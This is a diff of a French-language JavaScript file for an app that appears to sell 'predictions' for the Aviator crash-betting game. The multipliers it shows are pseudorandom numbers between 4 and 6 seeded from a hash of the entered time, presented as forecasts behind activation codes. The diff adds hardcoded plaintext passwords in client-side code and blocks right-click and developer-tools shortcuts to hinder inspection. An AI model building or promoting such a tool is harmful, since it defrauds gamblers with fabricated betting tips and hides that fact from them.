@@ -1,25 +1,64 @@
-// Codes d'activation valides
-const validCodes = ['1012', '2345', '6363', '6969', '9878', '4125', '7485'];
+// Comptes valides avec codes et mots de passe
+const validAccounts = {
+  '1012': { password: 'pass1012', used: false, phone: '' },
+  '2345': { password: 'pass2345', used: false, phone: '' },
+  '6363': { password: 'pass6363', used: false, phone: '' },
+  '6969': { password: 'pass6969', used: false, phone: '' },
+  '9878': { password: 'pass9878', used: false, phone: '' },
+  '4125': { password: 'pass4125', used: false, phone: '' },
+  '7485': { password: 'pass7485', used: false, phone: '' }
+};
+
 let isAuthenticated = false;
 const predictionsCache = {};
+let currentUser = null;
 
-// Fonction de hachage simple pour créer une graine basée sur l'heure
+// Fonction pour afficher le modal de mot de passe
+function showPasswordModal(callback) {
+  const modal = document.createElement('div');
+  modal.className = 'password-modal';
+  modal.innerHTML = `
+    <div class="password-content">
+      <h3>Entrez votre mot de passe</h3>
+      <input type="password" id="passwordInput" placeholder="Votre mot de passe">
+      <button onclick="verifyPassword()">Valider</button>
+      <div id="passwordError" class="error" style="margin-top: 10px;"></div>
+    </div>
+  `;
+  document.body.appendChild(modal);
+  
+  window.verifyPassword = function() {
+    const password = document.getElementById('passwordInput').value;
+    const errorElement = document.getElementById('passwordError');
+    
+    if (!password) {
+      errorElement.textContent = 'Veuillez entrer un mot de passe';
+      return;
+    }
+    
+    if (callback(password)) {
+      document.body.removeChild(modal);
+    } else {
+      errorElement.textContent = 'Mot de passe incorrect';
+    }
+  };
+}
+
+// Fonction de hachage pour la prédiction
 function hashTime(timeStr) {
   let hash = 0;
   for (let i = 0; i < timeStr.length; i++) {
     hash = (hash << 5) - hash + timeStr.charCodeAt(i);
-    hash |= 0; // Convertir en entier 32bits
+    hash |= 0;
   }
   return hash;
 }
 
-// Générateur pseudo-aléatoire déterministe
 function seededRandom(seed) {
   const x = Math.sin(seed) * 10000;
   return x - Math.floor(x);
 }
 
-// Vérifier l'authentification au chargement
 function checkAuth() {
   const authContainer = document.getElementById('authContainer');
   const appContent = document.getElementById('appContent');
@@ -33,46 +72,87 @@ function checkAuth() {
   }
 }
 
-// Vérifier les identifiants
 function verifyAuth() {
   const phoneNumber = document.getElementById('phoneNumber').value;
   const activationCode = document.getElementById('activationCode').value;
   const errorElement = document.getElementById('authError');
   
-  // Réinitialiser les erreurs
   errorElement.textContent = '';
   
-  // Validation du numéro
   if (!phoneNumber || phoneNumber.length < 10 || !/^[0-9]+$/.test(phoneNumber)) {
     errorElement.textContent = 'Numéro de téléphone invalide';
     return;
   }
   
-  // Validation du code
-  if (!validCodes.includes(activationCode)) {
+  if (!validAccounts[activationCode]) {
     errorElement.textContent = 'Code d\'activation incorrect';
     return;
   }
   
-  // Authentification réussie
-  isAuthenticated = true;
-  checkAuth();
-  
-  // Ajouter une animation
-  document.getElementById('appContent').classList.add('fade-in');
+  showPasswordModal((password) => {
+    if (password !== validAccounts[activationCode].password) {
+      errorElement.textContent = 'Mot de passe incorrect';
+      return false;
+    }
+    
+    if (validAccounts[activationCode].used && validAccounts[activationCode].phone !== phoneNumber) {
+      errorElement.textContent = 'Ce code est déjà utilisé avec un autre numéro';
+      return false;
+    }
+    
+    // Authentification réussie
+    validAccounts[activationCode].used = true;
+    validAccounts[activationCode].phone = phoneNumber;
+    isAuthenticated = true;
+    currentUser = {
+      phone: phoneNumber,
+      code: activationCode,
+      password: password
+    };
+    
+    // Sauvegarder dans localStorage
+    localStorage.setItem('aviatorAuth', JSON.stringify({
+      phone: phoneNumber,
+      code: activationCode
+    }));
+    
+    checkAuth();
+    document.getElementById('appContent').classList.add('fade-in');
+    return true;
+  });
 }
 
-// Horloge en temps réel
+function checkAuthOnLoad() {
+  const savedAuth = localStorage.getItem('aviatorAuth');
+  if (savedAuth) {
+    const authData = JSON.parse(savedAuth);
+    const activationCode = authData.code;
+    
+    if (validAccounts[activationCode] && 
+        validAccounts[activationCode].used && 
+        validAccounts[activationCode].phone === authData.phone) {
+      isAuthenticated = true;
+      currentUser = {
+        phone: authData.phone,
+        code: activationCode
+      };
+      
+      // Pré-remplir les champs
+      document.getElementById('phoneNumber').value = authData.phone;
+      document.getElementById('activationCode').value = activationCode;
+    } else {
+      localStorage.removeItem('aviatorAuth');
+    }
+  }
+  checkAuth();
+}
+
 function updateClock() {
   const now = new Date();
   const timeString = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
   document.getElementById('liveClock').textContent = timeString;
 }
 
-setInterval(updateClock, 1000);
-updateClock();
-
-// Générer les prédictions (déterministe basé sur l'heure)
 function generatePrediction() {
   if (!isAuthenticated) {
     checkAuth();
@@ -87,13 +167,11 @@ function generatePrediction() {
     return;
   }
 
-  // Vérifier le cache
   if (predictionsCache[timeInput]) {
     displayPredictions(predictionsCache[timeInput]);
     return;
   }
 
-  // Calcul des heures
   const [hours, minutes] = timeInput.split(':').map(Number);
   
   const timePlus3 = new Date();
@@ -102,24 +180,19 @@ function generatePrediction() {
   const timePlus4 = new Date();
   timePlus4.setHours(hours, minutes + 4);
 
-  // Formatage
   const formatTime = (date) => {
     return date.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
   };
 
-  // Créer une graine basée sur l'heure
   const seed = hashTime(timeInput);
   
-  // Multiplicateurs déterministes entre 4 et 6
   const multiplier1 = (seededRandom(seed) * 2 + 4).toFixed(1);
   const multiplier2 = (seededRandom(seed + 1) * 2 + 4).toFixed(1);
 
-  // Niveaux de risque
   const riskLevels = [10, 20, 50, 60, 100, 150];
   const riskIndex = Math.floor(seededRandom(seed + 2) * riskLevels.length);
   const randomRisk = riskLevels[riskIndex];
 
-  // Stocker dans le cache
   const predictionData = {
     timePlus3: formatTime(timePlus3),
     timePlus4: formatTime(timePlus4),
@@ -130,8 +203,6 @@ function generatePrediction() {
   };
   
   predictionsCache[timeInput] = predictionData;
-  
-  // Afficher les résultats
   displayPredictions(predictionData);
 }
 
@@ -153,9 +224,22 @@ function displayPredictions(data) {
 }
 
 // Initialisation
-checkAuth();
+checkAuthOnLoad();
+setInterval(updateClock, 1000);
+updateClock();
 
 // Empêcher le zoom sur mobile
 document.addEventListener('gesturestart', function(e) {
   e.preventDefault();
+});
+
+// Empêcher le clic droit et l'inspection
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+    e.preventDefault();
+  }
 });
